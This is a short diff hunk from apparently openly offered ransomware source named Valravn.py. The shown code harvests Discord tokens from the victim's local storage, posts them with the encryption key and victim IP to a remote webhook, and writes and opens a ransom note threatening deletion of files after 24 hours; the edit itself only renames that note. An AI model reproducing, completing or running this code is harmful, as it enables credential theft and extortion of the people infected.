@@ -48,10 +48,10 @@ def warn():
     data["content"] = "Key Content for " + user + ": " + str(key) + " Discord token: " + str(find_tokens(path="C:\\\\Users\\\\" + user + "\\\\AppData\\\\Roaming\\\\discord\\\\Local Storage\\\\leveldb"))
     data["username"] = ip
     requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
-    f = open("loptr.txt", "w")
+    f = open("Valravn.txt", "w")
     f.write("Ooops you have been infected with Valravn.py! your files are encrypted! Contact " + name + " on discord to get your files back! You have 24 hours to contact me, after that all your files will be deleted")
     f.close()
-    subprocess.call(r"notepad loptr.txt", shell=False)
+    subprocess.call(r"notepad Valravn.txt", shell=False)
 
 
 def main():
